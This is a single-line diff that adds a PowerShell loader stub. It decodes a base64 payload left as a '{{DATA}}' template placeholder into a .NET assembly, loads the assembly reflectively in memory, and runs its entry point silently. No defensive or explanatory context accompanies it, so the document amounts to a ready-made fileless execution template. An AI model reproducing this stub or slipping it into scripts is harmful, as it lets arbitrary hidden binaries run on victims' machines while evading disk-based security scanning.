@@ -1,0 +1,1 @@
+$asm=[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String("{{DATA}}"));$asm.EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null
